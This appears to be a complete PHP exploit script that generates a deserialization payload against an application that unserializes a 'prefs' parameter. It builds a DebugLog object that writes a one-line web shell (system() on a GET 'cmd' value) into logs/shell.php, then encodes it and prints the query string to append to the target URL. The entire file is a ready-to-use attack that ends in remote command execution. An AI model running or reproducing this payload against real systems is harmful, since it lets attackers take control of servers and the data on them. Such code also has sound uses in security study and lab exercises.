<?php
// exploit.php

class DebugLog {
    public $logFile;
    public $logMessage;
}

$payload = new DebugLog();

// The attacker uses the leaked info to target the writable directory
$payload->logFile = "logs/shell.php"; 
$payload->logMessage = '<?php system($_GET["cmd"]); ?>';

$serialized = serialize($payload);
$encoded = base64_encode($serialized);

// URL-encode the Base64 string so '+' becomes '%2B'
$safeForUrl = urlencode($encoded);

echo "Copy this payload and append it to the URL:\n\n";
echo "?prefs=" . $safeForUrl . "\n";

?>
